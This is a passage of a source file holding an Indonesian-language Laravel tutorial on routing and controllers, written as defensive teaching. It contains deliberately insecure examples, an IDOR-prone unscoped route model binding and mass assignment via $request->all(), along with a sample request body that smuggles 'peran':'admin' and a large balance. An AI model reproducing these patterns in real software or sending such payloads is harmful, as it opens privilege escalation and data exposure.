        'Titik dua pada `{artikel:slug}` menyuruh Laravel mencari berdasarkan kolom `slug`, bukan `id` — itulah yang membuat alamat artikel bisa berbentuk `/artikel/belajar-laravel` alih-alih `/artikel/42`. Syaratnya kolom itu harus `UNIQUE` di database; tanpa itu, dua artikel berslug sama akan membuat alamatnya ambigu.',
      ),
      p(
        '`scopeBindings()` menutup celah yang sangat mudah terlewat pada rute bersarang. Tanpa itu, Laravel mencari `{artikel}` dan `{komentar}` secara **terpisah**, sehingga `/artikel/1/komentar/999` akan mengembalikan komentar 999 walaupun ia sebenarnya milik artikel 7 — alamatnya berbohong, dan aplikasimu ikut membenarkannya. Dengan `scopeBindings()`, komentar dicari **di dalam** artikel induknya, jadi pasangan yang tidak cocok menghasilkan `404`. Perhatikan ini sekaligus lapisan pertahanan tambahan: kalau kewenangan diperiksa di tingkat artikel, komentar yang tidak benar-benar miliknya tidak bisa lolos lewat celah ini.',
      ),

      h2('Grup rute'),
      code(
        'php',
        `
        Route::middleware('auth:sanctum')->group(function () {
            Route::apiResource('catatan', CatatanController::class);
            Route::apiResource('tag', TagController::class);
        });

        Route::prefix('admin')
            ->middleware(['auth:sanctum', 'can:kelola-pengguna'])
            ->group(function () {
                Route::get('/pengguna', [AdminController::class, 'daftarPengguna']);
            });
        `,
      ),
      p(
        'Grup rute adalah padanan `app.use(\'/api\', middleware, router)` di Express: penjagaan dipasang **sekali** untuk sekelompok rute, bukan diulang di setiap baris. Blok pertama membungkus semua rute di dalamnya dengan `auth:sanctum`, sehingga rute baru yang ditambahkan ke dalam grup itu otomatis ikut terlindungi — inilah bentuk konkret prinsip "default tolak" dari sub-bab 5.1. Rute yang ditulis di luar grup adalah rute yang **sengaja** dibuka.',
      ),
      p(
        'Blok kedua menumpuk tiga setelan sekaligus. `prefix(\'admin\')` menambahkan `/admin` di depan setiap alamat di dalamnya, sementara array middleware-nya menerapkan dua lapisan berurutan. `auth:sanctum` menjawab "siapa kamu", lalu `can:kelola-pengguna` menjawab "boleh tidak kamu di sini", mengikuti pemisahan autentikasi dan otorisasi yang sama seperti di sub-bab 5.6. Urutannya penting, sebab memeriksa izin sebelum identitas dipastikan tidak ada artinya.',
      ),

      h2('Memeriksa rute yang benar-benar terdaftar'),
      code(
        'bash',
        `
        php artisan route:list
        php artisan route:list --path=catatan
        `,
      ),
      p(
        'Perintah ini menjawab pertanyaan yang tidak bisa dijawab dengan membaca berkas rute, yaitu **apa yang benar-benar terdaftar**. Karena `apiResource` membuat lima rute dari satu baris dan grup menyuntikkan middleware dari tempat lain, susunan akhirnya tidak terlihat utuh di satu berkas mana pun. Keluarannya menampilkan method, alamat, controller, dan yang paling berguna, daftar middleware yang benar-benar melekat pada setiap rute.',
      ),
      p(
        'Jadikan kolom middleware itu alat audit rutin: setiap baris yang seharusnya terlindungi tetapi kolomnya kosong adalah endpoint terbuka, dan inilah cara tercepat menemukan rute yang lupa dimasukkan ke dalam grup `auth`. Opsi `--path=catatan` menyaring keluarannya saat daftarnya sudah terlalu panjang untuk dibaca sekaligus.',
      ),
      callout(
        'tip',
        'Pakai ini untuk mengaudit keamanan',
        'Jalankan `route:list` dan periksa kolom middleware-nya. Setiap rute yang seharusnya terlindungi tapi kolomnya kosong adalah endpoint terbuka. Ini cara tercepat menemukan rute yang lupa dimasukkan ke grup `auth`.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Routing Laravel punya sifat yang sama dengan Express dan menghasilkan kelas bug yang sama, yaitu **rute dicocokkan berurutan dan yang pertama cocok yang menang**. Bedanya, Laravel menambahkan satu lapisan yang membuat sebagian kesalahannya berteriak lebih awal.',
      ),
      code(
        'php',
        `
        // Urutan yang SALAH. Rute kedua tidak akan pernah tercapai.
        Route::get('/pesanan/{id}', [PesananController::class, 'show']);
        Route::get('/pesanan/terbaru', [PesananController::class, 'terbaru']);

        // GET /pesanan/terbaru mencocoki rute PERTAMA, dengan id = "terbaru".

        // Urutan yang BENAR: yang lebih khusus lebih dulu.
        Route::get('/pesanan/terbaru', [PesananController::class, 'terbaru']);
        Route::get('/pesanan/{id}', [PesananController::class, 'show']);

        // Atau lebih baik lagi: batasi bentuk parameternya, sehingga urutan
        // tidak lagi menentukan dan salah ketik jadi 404 yang jujur.
        Route::get('/pesanan/{id}', [PesananController::class, 'show'])
            ->whereNumber('id');
        `,
        {
          caption:
            'whereNumber membuat /pesanan/terbaru TIDAK cocok dengan rute berparameter itu sama sekali.',
        },
      ),
      p(
        "Baris `whereNumber` itu menyelesaikan lebih dari sekadar urutan. Tanpanya, sebuah alamat seperti `/pesanan/abc` akan masuk ke controller dengan `$id` bernilai string `'abc'`, dan hasilnya bergantung pada apa yang dilakukan kode di dalamnya. Bila nilai itu diteruskan ke query bertipe integer, yang muncul adalah error basis data. Di PostgreSQL bentuknya sudah diukur pada bab database.",
      ),
      code(
        'text',
        `
        SELECT * FROM pesanan WHERE id = 'terbaru';

          ERROR:  invalid input syntax for type integer: "terbaru"
          LINE 1: SELECT * FROM pesanan WHERE id = 'terbaru';
                                                   ^
        `,
        { caption: 'Dijalankan sungguhan pada PostgreSQL 16.15 di bab database sebelumnya.' },
      ),
      p(
        'Error itu muncul sebagai `500` di log, membunyikan sistem pemantauan, dan sebenarnya bukan kesalahan server melainkan alamat yang tidak ada. Dengan `whereNumber`, ia menjadi `404` yang tidak membangunkan siapa pun.',
      ),
      p(
        'Fitur routing Laravel yang paling sering dipakai setengah benar adalah **route model binding**, yaitu Laravel mengambil sendiri baris basis datanya dari parameter rute.',
      ),
      code(
        'php',
        `
        // Laravel mengambil Pesanan dengan id itu, dan menjawab 404 bila tidak ada.
        Route::get('/pesanan/{pesanan}', function (Pesanan $pesanan) {
            return $pesanan;
        });

        // TERLIHAT aman karena 404-nya otomatis. Sebenarnya ini IDOR:
        // Laravel memeriksa apakah barisnya ADA, BUKAN apakah kamu BERHAK atasnya.
        // Pengguna mana pun yang sudah login bisa membuka pesanan siapa pun.
        `,
        {
          caption:
            'Diukur di bab auth: syarat kepemilikan harus ikut ke dalam query, bukan diperiksa sesudahnya.',
        },
      ),
      p(
        'Perbaikannya memindahkan batas kepemilikan ke dalam pencarian barisnya, sehingga baris milik orang lain tidak pernah kembali sama sekali.',
      ),
      code(
        'php',
        `
        // Binding yang dibatasi pemiliknya — 404-nya kini benar-benar berarti
        // "tidak ada pesanan itu MILIKMU", bukan sekadar "tidak ada pesanan itu".
        Route::get('/pesanan/{pesanan}', function (Pesanan $pesanan) {
            return $pesanan;
        })->whereNumber('pesanan')
          ->middleware('auth');

        // Di dalam model, batasi lewat scope global atau lewat binding eksplisit:
        Route::bind('pesanan', function (string $nilai) {
            return Pesanan::where('id', $nilai)
                ->where('pelanggan_id', auth()->id())   // <-- syaratnya di QUERY
                ->firstOrFail();
        });
        `,
        {
          caption:
            'firstOrFail menghasilkan 404, dan barisnya tidak pernah terbaca bila bukan milik pemanggil.',
        },
      ),

      h2('Saat error-nya muncul'),
      p(
        'Laravel punya beberapa error routing yang bunyinya khas, dan mengenalinya menghemat banyak waktu karena masing-masing menunjuk satu penyebab yang sempit.',
      ),
      code(
        'text',
        `
        1. Route [pesanan.show] not defined.

           Muncul dari route('pesanan.show') pada nama rute yang tidak ada.
           Penyebab tersering: nama rutenya salah ketik, atau rutenya ada
           tapi TIDAK diberi ->name(). Periksa dengan: php artisan route:list

        2. Target class [PesananController] does not exist.

           Namespace-nya tidak cocok, atau berkasnya tidak ada di tempat yang
           sesuai PSR-4. Ini kelanjutan langsung dari kegagalan autoload
           yang sudah diuraikan di sub-bab Composer.

        3. The GET method is not supported for route pesanan. Supported methods: POST.

           Rutenya ADA, method-nya yang berbeda. Sering muncul setelah formulir
           dikirim ulang lewat tombol kembali, atau saat pengalihan mengubah
           POST menjadi GET.

        4. Missing required parameter for [Route: pesanan.show] [URI: pesanan/{id}].

           route('pesanan.show') dipanggil tanpa memberi id-nya.
        `,
      ),
      p(
        'Kelompok kegagalan kedua tidak menghasilkan error sama sekali, yaitu **urutan middleware**, dan gejalanya berupa pemeriksaan yang seolah-olah tidak berjalan.',
      ),
      code(
        'php',
        `
        // Middleware berjalan berurutan, dan urutannya adalah urutan penulisan.
        Route::middleware(['auth', 'verified', 'throttle:6,1'])
            ->group(function () { /* ... */ });

        // Dua akibat yang sering tidak disadari:
        //
        // 1. throttle DI BELAKANG auth berarti pembatasan lajunya hanya berlaku
        //    untuk yang SUDAH login. Endpoint login sendiri butuh throttle
        //    yang berjalan SEBELUM autentikasi — kalau tidak, penebakan sandi
        //    tidak pernah terbatasi sama sekali.
        //
        // 2. Middleware yang menjawab sendiri menghentikan rantai. Yang di
        //    bawahnya tidak berjalan, dan itu memang yang diinginkan — asal
        //    kamu tahu yang mana yang berhenti.
        `,
        { caption: 'Diukur di bab auth: tanpa backoff, 24 jam cukup untuk ratusan ribu tebakan.' },
      ),
      p(
        'Catatan tentang `throttle` di atas layak ditegaskan karena akibatnya besar dan penyebabnya sepele. Pembatasan laju yang dipasang di belakang autentikasi hanya membatasi pengguna yang sudah masuk, sedangkan yang perlu dibatasi justru penyerang yang **belum** masuk dan sedang menebak sandi.',
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Routing terasa sebagai bagian yang paling sederhana, dan sebagian kesalahannya justru berakibat keamanan.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menaruh rute berparameter di atas rute statis',
            'Urutannya terasa tidak penting',
            '`/pesanan/terbaru` tertangkap `/pesanan/{id}`. Batasi bentuknya dengan `whereNumber`',
          ],
          [
            'Memakai route model binding tanpa membatasi pemilik',
            '404-nya sudah otomatis',
            'Laravel memeriksa keberadaan, bukan kewenangan. Itu IDOR — batasi di query',
          ],
          [
            'Tidak membatasi bentuk parameter rute',
            'Nanti divalidasi di controller',
            'Nilai seperti `abc` sampai ke query dan menghasilkan `500`, padahal seharusnya `404`',
          ],
          [
            'Memasang `throttle` di belakang `auth`',
            'Urutannya terasa wajar',
            'Pembatasan lajunya tidak berlaku untuk yang belum login, yaitu justru penyerang yang menebak sandi',
          ],
          [
            'Menulis logika di dalam closure rute',
            'Lebih cepat ditulis',
            '`route:cache` tidak bisa dipakai bila ada closure, dan logikanya tidak bisa diuji terpisah',
          ],
          [
            'Tidak memberi nama pada rute',
            'Alamatnya sudah jelas',
            'Setiap perubahan alamat berarti mencari seluruh penulisan URL di seluruh kode dan template',
          ],
        ],
      ),
      p(
        'Baris kelima memuat akibat yang nyata dan sering baru diketahui saat deploy. Perintah `route:cache` mempercepat penyalaan aplikasi dengan menyimpan seluruh definisi rute dalam bentuk siap pakai, dan ia **menolak berjalan** bila ada rute yang isinya closure, sebab closure tidak bisa disimpan. Jadi kebiasaan menulis logika langsung di dalam rute menutup salah satu optimasi produksi yang paling mudah didapat.',
      ),
      references(
        {
          label: 'Routing',
          href: 'https://laravel.com/docs/12.x/routing',
          source: 'Laravel',
          note: 'Bentuk rute, grup, prefiks, dan beda `api.php` dari `web.php`.',
        },
        {
          label: 'Route Model Binding',
          href: 'https://laravel.com/docs/12.x/routing#route-model-binding',
          source: 'Laravel',
          note: 'Termasuk custom key dan `scopeBindings()` untuk binding bersarang.',
        },
        {
          label: 'Controllers — Resource Controllers',
          href: 'https://laravel.com/docs/12.x/controllers#resource-controllers',
          source: 'Laravel',
          note: 'Lima rute yang dihasilkan `apiResource` beserta nama metodenya.',
        },
        {
          label: 'Authorization Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Kenapa mengambil data dan memeriksa kewenangan adalah dua langkah terpisah.',
        },
      ),
    ],
  ),

  written(
    'controller',
    'Controller & Resource Controller',
    17,
    'Tempat permintaan diterima dan jawabannya disusun.',
    [
      terms(
        {
          term: 'controller',
          meaning:
            'Kelas tempat permintaan diterima dan jawabannya disusun. Sama seperti di Express, ia boleh tahu HTTP berupa status, header, dan bentuk respons, tapi tidak boleh memuat aturan bisnis maupun SQL mentah.',
        },
        {
          term: 'resource controller',
          meaning:
            'Controller dengan **lima metode bernama baku**: `index`, `store`, `show`, `update`, `destroy`. Nama itu yang dipetakan `apiResource`. Konvensi ini membuat setiap project Laravel bisa dibaca tanpa membuka daftar rutenya.',
        },
        {
          term: 'make:controller --api',
          meaning:
            'Perintah artisan yang menghasilkan kerangka resource controller **tanpa** metode `create` dan `edit` — dua metode yang hanya berguna untuk aplikasi berhalaman HTML, bukan API.',
        },
        {
          term: 'validated()',
          meaning:
            'Metode Form Request yang mengembalikan **hanya field yang lolos skema** — bukan seluruh isi request. Memakainya alih-alih `$request->all()` adalah pertahanan utama terhadap mass assignment.',
        },
        {
          term: 'query scope ke pemilik',
          meaning:
            "Baris `->where('penulis_id', $request->user()->id)` pada `index`. Ia pertahanan **di lapisan data**: bahkan kalau otorisasi di tempat lain terlewat, daftar tetap hanya berisi milik pemanggilnya.",
        },
        {
          term: 'paginate',
          meaning:
            'Metode Eloquent yang memecah hasil jadi halaman dan menyertakan metadata (`total`, `current_page`). Perhatikan `min(..., 100)` — **batas atas dari server**, supaya `?per_page=999999` tidak memaksa seluruh tabel dimuat.',
        },
        {
          term: 'JsonResponse',
          meaning:
            'Tipe kembalian yang dipakai saat kamu perlu mengatur **status code atau header** sendiri. Untuk jawaban `200` sederhana, mengembalikan Resource langsung sudah cukup.',
        },
        {
          term: 'route() helper',
          meaning:
            "Menyusun URL dari **nama rute**, bukan merangkainya sebagai string. `route('catatan.show', $catatan)` tetap benar meski bentuk path-nya nanti diubah — dan itulah gunanya nama rute.",
        },
        {
          term: 'controller tipis',
          meaning:
            'Prinsip yang berlaku di framework mana pun: controller **mengoordinasi**, tidak menghitung. Begitu ia memuat aturan bisnis, aturan itu jadi tidak bisa dipakai dari perintah artisan, job terjadwal, maupun tes.',
        },
      ),

      h2('Membuat controller'),
      code(
        'bash',
        `
        php artisan make:controller CatatanController --api --model=Catatan
        `,
      ),
      code(
        'php',
        `
        <?php

        declare(strict_types=1);

        namespace App\\Http\\Controllers;

        use App\\Http\\Requests\\SimpanCatatanRequest;
        use App\\Http\\Resources\\CatatanResource;
        use App\\Models\\Catatan;
        use Illuminate\\Http\\JsonResponse;
        use Illuminate\\Http\\Request;

        final class CatatanController extends Controller
        {
            public function index(Request $request): JsonResponse
            {
                $catatan = Catatan::query()
                    // Scope ke pemilik — pertahanan di lapisan data.
                    ->where('penulis_id', $request->user()->id)
                    ->latest()
                    ->paginate(perPage: min((int) $request->query('per_page', 20), 100));

                return CatatanResource::collection($catatan)->response();
            }

            public function store(SimpanCatatanRequest $request): JsonResponse
            {
                // validated() hanya berisi field yang LOLOS skema —
                // bukan seluruh isi request.
                $catatan = $request->user()->catatan()->create($request->validated());

                return (new CatatanResource($catatan))
                    ->response()
                    ->setStatusCode(201)
                    ->header('Location', route('catatan.show', $catatan));
            }

            public function show(Catatan $catatan): CatatanResource
            {
                $this->authorize('view', $catatan);

                return new CatatanResource($catatan);
            }

            public function update(SimpanCatatanRequest $request, Catatan $catatan): CatatanResource
            {
                $this->authorize('update', $catatan);
                $catatan->update($request->validated());

                return new CatatanResource($catatan);
            }

            public function destroy(Catatan $catatan): Response
            {
                $this->authorize('delete', $catatan);
                $catatan->delete();

                return response()->noContent();   // 204
            }
        }
        `,
      ),
      p(
        "Perhatikan `index` memakai `where('penulis_id', ...)` sedangkan empat method lain memakai `$this->authorize(...)`. Perbedaan itu bukan ketidakkonsistenan melainkan keharusan, dan alasannya sama seperti di sub-bab 5.6: Policy bekerja **per objek**, dan endpoint daftar tidak memanggilnya untuk setiap baris. Untuk daftar, penjagaannya harus ada di query. Perhatikan pula batas paginasinya ditulis `min((int) ..., 100)` — batas atas dari sisi server, supaya `?per_page=999999` tidak memaksa seluruh tabel masuk ke memori.",
      ),
      p(
        'Pada `store`, dua hal menutup celah mass assignment sekaligus. `$request->validated()` mengembalikan **hanya** field yang lolos aturan Form Request, bukan seluruh isi body — jadi `{"penulis_id":999}` yang diselipkan penyerang tidak akan ikut. Dan `$request->user()->catatan()->create(...)` membuat catatan **lewat relasi** penggunanya, sehingga `penulis_id` diisi Laravel dari pengguna yang terautentikasi dan tidak mungkin ditentukan klien. Bandingkan dengan `Catatan::create($request->validated())` yang tampak lebih sederhana tetapi menyerahkan kepemilikan kepada isi body.',
      ),
      p(
        'Tiga method terakhir memperlihatkan pola yang harus kamu ulangi di setiap sumber daya: `authorize` **sebelum** menyentuh datanya, dengan nama aksi yang cocok dengan method di Policy (`view`, `update`, `delete`). Menghapus satu baris `authorize` cukup untuk membuka IDOR, karena route model binding sudah terlanjur menyerahkan objeknya. Perhatikan pula status yang dikembalikan mengikuti kontrak dari Bab 3: `201` beserta header `Location` untuk pembuatan, dan `noContent()` yang berarti `204` tanpa body untuk penghapusan.',
      ),

      h2('Tujuh method baku'),
      table(
        ['Method', 'Rute', 'Untuk'],
        [
          ['`index`', '`GET /catatan`', 'Daftar'],
          ['`store`', '`POST /catatan`', 'Buat — kembalikan 201'],
          ['`show`', '`GET /catatan/{id}`', 'Satu item'],
          ['`update`', '`PUT/PATCH /catatan/{id}`', 'Ubah'],
          ['`destroy`', '`DELETE /catatan/{id}`', 'Hapus — kembalikan 204'],
          ['`create`, `edit`', '(hanya `web`)', 'Menampilkan form — tidak ada di API'],
        ],
      ),

      h2('Controller harus tetap tipis'),
      compare(
        {
          title: 'Terlalu gemuk',
          lang: 'php',
          code: `
          public function store(Request $request)
          {
              // validasi manual
              // hitung diskon
              // kurangi stok
              // buat pesanan
              // kirim email
              // catat log
              // 80 baris
          }
          `,
          notes: ['Tidak bisa dipakai ulang dari perintah artisan atau job', 'Sulit diuji'],
        },
        {
          title: 'Tipis',
          lang: 'php',
          code: `
          public function store(
              BuatPesananRequest $request,
              LayananPesanan $layanan,
          ): JsonResponse {
              $pesanan = $layanan->buat(
                  $request->user(),
                  $request->validated(),
              );

              return (new PesananResource($pesanan))
                  ->response()
                  ->setStatusCode(201);
          }
          `,
          notes: ['Aturan bisnis ada di service', 'Bisa dipanggil dari mana saja'],
        },
      ),
      p(
        'Enam komentar di kolom kiri sebenarnya enam tanggung jawab yang berbeda, dan hanya satu di antaranya, yaitu menyusun respons, yang benar-benar urusan controller. Sisanya adalah aturan bisnis yang terkurung di dalam method HTTP. Begitu perhitungan diskon dan pengurangan stok berada di sana, kamu tidak bisa memakainya lagi dari perintah artisan, dari job antrean, atau dari impor CSV, tanpa memalsukan sebuah objek `Request`.',
      ),
      p(
        'Kolom kanan memindahkan semuanya ke `LayananPesanan`, dan perhatikan bagaimana service itu **masuk lewat parameter method**, bukan dibuat dengan `new`. Laravel membaca tipenya dan menyuntikkan instansnya dari service container — mekanisme yang sama seperti injeksi konstruktor tadi, dan itulah yang membuat service-nya bisa diganti versi tiruan saat menguji. Perhatikan pula service menerima `$request->user()` dan `$request->validated()`, bukan objek `$request` itu sendiri: dengan begitu service tetap tidak mengenal HTTP, sesuai batas yang sama seperti di sub-bab 3.9.',
      ),
      callout(
        'tip',
        'Aturan yang sama dengan Bab 3.8',
        'Controller bicara HTTP: membaca permintaan, memanggil service, menyusun respons. Ia tidak memuat aturan bisnis, dan service tidak boleh menyebut `Request` maupun `Response`. Batasnya identik dengan yang kamu terapkan di Express — hanya namanya yang berbeda.',
      ),

      h2('Single action controller'),
      code(
        'php',
        `
        // Untuk aksi yang berdiri sendiri
        final class TerbitkanArtikelController extends Controller
        {
            public function __invoke(Artikel $artikel): ArtikelResource
            {
                $this->authorize('terbitkan', $artikel);
                $artikel->terbitkan();

                return new ArtikelResource($artikel);
            }
        }

        Route::post('/artikel/{artikel}/terbitkan', TerbitkanArtikelController::class);
        `,
      ),
      p(
        'Method bernama `__invoke` membuat objeknya bisa dipanggil seperti fungsi, dan itulah sebabnya rutenya cukup menyebut nama kelas tanpa nama method. Bentuk ini dipakai untuk aksi yang **tidak muat** dalam tujuh method baku — "terbitkan" bukan `store` maupun `update`, dan memaksakannya ke sana hanya akan membuat `update` menjadi method serba guna yang bercabang-cabang.',
      ),
      p(
        'Perhatikan alamatnya `/artikel/{artikel}/terbitkan` memakai kata kerja, padahal REST menganjurkan alamat berupa benda. Itu pengecualian yang wajar dan umum: untuk **transisi keadaan** seperti menerbitkan, membatalkan, atau mengarsipkan, alamat berkata kerja jauh lebih jujur daripada memaksa klien mengirim `PATCH {"status":"terbit"}` dan berharap servernya menjalankan seluruh aturan penerbitan. Perhatikan pula `authorize(\'terbitkan\', ...)` tetap ada — aksi khusus butuh method Policy-nya sendiri, bukan menumpang pada `update`.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Controller adalah tempat yang paling cepat membesar di aplikasi Laravel, dan penyebabnya bukan kemalasan melainkan bahwa setiap tambahan terasa kecil. Satu validasi, satu pemeriksaan izin, satu perhitungan, satu pengiriman surel, dan setelah setahun sebuah method berisi dua ratus baris yang tidak bisa diuji tanpa menyalakan seluruh aplikasi.',
      ),
      code(
        'php',
        `
        // Bentuk yang tumbuh sendiri, dan setiap barisnya terasa wajar saat ditulis.
        public function store(Request $request)
        {
            $data = $request->validate([
                'produk_id' => 'required|integer|exists:produk,id',
                'jumlah' => 'required|integer|min:1|max:99',
            ]);

            $produk = Produk::findOrFail($data['produk_id']);
            if ($produk->stok < $data['jumlah']) {
                return response()->json(['error' => 'Stok kurang'], 409);
            }

            $diskon = $data['jumlah'] >= 12 ? 0.1 : ($data['jumlah'] >= 6 ? 0.05 : 0);
            $total = (int) round($produk->harga * $data['jumlah'] * (1 - $diskon));

            $pesanan = Pesanan::create([
                'pelanggan_id' => auth()->id(),
                'produk_id' => $produk->id,
                'jumlah' => $data['jumlah'],
                'total' => $total,
            ]);
            $produk->decrement('stok', $data['jumlah']);

            Mail::to(auth()->user())->send(new PesananDiterima($pesanan));

            return response()->json($pesanan, 201);
        }
        `,
        {
          caption:
            'Untuk menguji satu aturan diskon di sini, dibutuhkan HTTP, basis data, dan pengirim surel sekaligus.',
        },
      ),
      p(
        'Aturan diskonnya sendiri hanya dua baris dan sepenuhnya bisa dihitung tanpa apa pun. Yang membuatnya tidak terjangkau test bukan kerumitannya melainkan **tempatnya**. Selama ia tinggal di dalam method controller, mengujinya berarti mengirim permintaan HTTP sungguhan, menyiapkan basis data berisi produk, dan mencegah surelnya benar-benar terkirim.',
      ),
      p(
        'Pemisahannya tidak dimulai dari membuat banyak kelas melainkan dari memindahkan **satu hal** ke tempat yang tidak bergantung pada apa pun.',
      ),
      code(
        'php',
        `
        <?php
        declare(strict_types=1);

        namespace App\\Domain;

        // Tanpa Request, tanpa Eloquent, tanpa Mail. Bisa diuji langsung.
        final class Diskon
        {
            public static function untuk(int $jumlah): float
            {
                if ($jumlah >= 12) return 0.10;
                if ($jumlah >= 6) return 0.05;
                return 0.0;
            }

            public static function total(int $harga, int $jumlah): int
            {
                return (int) round($harga * $jumlah * (1 - self::untuk($jumlah)));
            }
        }

        // Testnya tidak butuh apa pun, dan yang paling penting ada DI BATAS,
        // sebab di situlah kesalahan >= melawan > bersembunyi:
        //   Diskon::untuk(5)  -> 0.0
        //   Diskon::untuk(6)  -> 0.05
        //   Diskon::untuk(11) -> 0.05
        //   Diskon::untuk(12) -> 0.10
        `,
        {
          caption:
            'Empat baris uji itu mustahil ditulis dengan nyaman selama aturannya masih di dalam controller.',
        },
      ),
      p(
        'Setelah itu, controller-nya menyusut menjadi apa yang memang tugasnya, yaitu menerjemahkan antara permintaan HTTP dan jawaban HTTP.',
      ),
      code(
        'php',
        `
        public function store(BuatPesananRequest $request, LayananPesanan $layanan)
        {
            // 1. Validasi sudah selesai sebelum baris ini — di Form Request.
            // 2. Aturan bisnis ada di service, yang melempar error bermakna.
            // 3. Status code diputuskan di sini, dan HANYA di sini.
            $pesanan = $layanan->buat(
                pelangganId: auth()->id(),
                produkId: $request->integer('produk_id'),
                jumlah: $request->integer('jumlah'),
            );

            return PesananResource::make($pesanan)
                ->response()
                ->setStatusCode(201)
                ->header('Location', route('pesanan.show', $pesanan));
        }
        `,
        {
          caption:
            'Tidak ada try/catch: error dari service ditangani terpusat di exception handler.',
        },
      ),

      h2('Saat error-nya muncul'),
      p(
        'Controller Laravel menghasilkan beberapa error yang bunyinya sangat khas, dan masing-masing menunjuk satu penyebab yang sempit.',
      ),
      code(
        'text',
        `
        1. Call to a member function ... on null

           Muncul dari Model::find($id) yang tidak menemukan apa pun lalu
           hasilnya langsung dipakai. Pakai findOrFail() yang menghasilkan 404,
           atau periksa null-nya secara eksplisit.

        2. Argument #1 ($produkId) must be of type int, string given

           Nilai dari request SELALU string. Pakai $request->integer('produk_id')
           alih-alih $request->input('produk_id'), atau ubah tipenya di Form Request.
           Ini bentuk PHP dari hal yang sudah diukur di bab Fondasi:
           "2" - 1 berhasil, "2" + 1 menghasilkan "21".

        3. Undefined array key "jumlah"

           Field tidak ada di badan permintaan, dan validasinya tidak
           mewajibkannya. Muncul sebagai 500, padahal seharusnya 422.

        4. Maximum function nesting level reached / memori habis

           Hampir selalu relasi Eloquent yang saling memanggil saat diubah
           menjadi array, misalnya pesanan->pelanggan->pesanan.
        `,
      ),
      p(
        'Error kedua layak diperjelas karena ia berbeda perilakunya antara PHP ketat dan PHP longgar, dan bedanya sudah diukur di sub-bab pertama bab ini.',
      ),
      code(
        'text',
        `
        Dengan declare(strict_types=1):
          hitungTotal('89000', 2)  -> TypeError, langsung terlihat

        Tanpa baris itu:
          hitungTotal('89000', 2)  -> 178000
          hitungTotal(89000.5, 2)  -> 178000   <- pecahannya hilang tanpa jejak
          hitungTotal(true, 2)     -> 2
        `,
        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
      ),
      p(
        'Karena seluruh nilai dari permintaan HTTP tiba sebagai string, controller adalah tempat pertama perubahan tipe itu harus terjadi, dan sebaiknya terjadi **sekali**, di Form Request, bukan berulang kali di setiap tempat pemakaian.',
      ),
      p(
        'Kelompok kegagalan ketiga tidak menghasilkan error dan merupakan kerentanan, yaitu **mass assignment**.',
      ),
      code(
        'php',
        `
        // Berbahaya: seluruh isi request diteruskan apa adanya.
        Pengguna::create($request->all());
        $pengguna->update($request->all());

        // Klien mengirim {"nama":"Rina","peran":"admin","saldo":9999999}
        // dan dua field terakhir ikut tersimpan bila $fillable memuatnya
        // atau bila $guarded dikosongkan.

        // Aman: sebut field yang memang diterima, satu per satu.
        $pengguna->update($request->safe()->only(['nama', 'email']));
        `,
        { caption: 'Ini bentuk PHP dari mass assignment yang sudah dibahas di bab Express.' },
      ),
      p(
        'Laravel memang menyediakan `$fillable` dan `$guarded` sebagai perlindungan, dan keduanya bekerja. Yang membatalkannya adalah kebiasaan menulis `protected $guarded = []` untuk menghindari kerepotan, sebab baris itu berarti **seluruh kolom boleh diisi dari mana saja**, termasuk kolom yang menentukan peran dan saldo.',
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Controller adalah tempat yang paling mudah dijadikan tempat menampung segalanya, sebab setiap tambahannya terasa kecil.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menaruh aturan bisnis di dalam controller',
            'Paling langsung terbaca',
            'Aturannya hanya bisa diuji lewat HTTP dan basis data sungguhan. Pindahkan ke kelas biasa',
          ],
          [
            'Memakai `$request->all()` untuk membuat atau mengubah',
            'Field-nya sudah sesuai',
            'Mass assignment. Klien bisa menyisipkan `peran` dan `saldo`. Sebut field yang diterima',
          ],
          [
            'Menulis `protected $guarded = []`',
            'Menghindari kerepotan mengurus `$fillable`',
            'Itu membuka SELURUH kolom untuk diisi dari permintaan. Perlindungannya dimatikan sepenuhnya',
          ],
          [
            'Memakai `find()` lalu langsung memakai hasilnya',
            'Datanya pasti ada',
            '`Call to a member function on null` sebagai `500`, padahal seharusnya `404`. Pakai `findOrFail()`',
          ],
          [
            'Memakai nilai request tanpa mengubah tipenya',
            'Isinya memang angka',
            'Seluruhnya string. Tanpa `strict_types`, `89000.5` dipotong diam-diam menjadi `89000`',
          ],
          [
            'Membungkus setiap method dengan `try/catch`',
            'Itu cara menangani error',
            'Bentuk responsnya jadi berbeda-beda di tiap method. Lempar error bermakna, tangani terpusat',
          ],
        ],
      ),
      p(
        'Baris ketiga pantas ditegaskan karena ia satu baris yang membatalkan sebuah perlindungan bawaan secara diam-diam. Menulis `$guarded = []` biasanya dilakukan saat sedang buru-buru, terasa tidak berbahaya karena aplikasinya belum punya kolom sensitif, lalu tetap di sana ketika kolom `peran` ditambahkan enam bulan kemudian. Yang menutupnya bukan kedisiplinan mengingat melainkan menyebut field yang diterima secara eksplisit pada setiap pemanggilan, sehingga kolom baru tidak pernah otomatis ikut.',
      ),
      references(
        {
          label: 'Controllers',
          href: 'https://laravel.com/docs/12.x/controllers',
          source: 'Laravel',
          note: 'Resource controller, single action controller, dan injeksi lewat metode.',
        },
        {
          label: 'Eloquent — Pagination',
          href: 'https://laravel.com/docs/12.x/pagination',
          source: 'Laravel',
          note: 'Bentuk `paginate()` beserta metadata yang ia sertakan di respons.',
        },
        {
          label: 'HTTP Responses',
          href: 'https://laravel.com/docs/12.x/responses',
          source: 'Laravel',
          note: 'Mengatur status code dan header, termasuk `Location` untuk `201`.',
        },
        {
          label: 'URL Generation — route()',
          href: 'https://laravel.com/docs/12.x/urls#urls-for-named-routes',
          source: 'Laravel',
          note: 'Menyusun URL dari nama rute alih-alih merangkai string.',
        },
      ),
    ],
  ),

  written(
    'blade',
    'Blade Sekilas',
    15,
    'Template engine Laravel — dan kapan kamu tidak membutuhkannya.',
    [
      p(
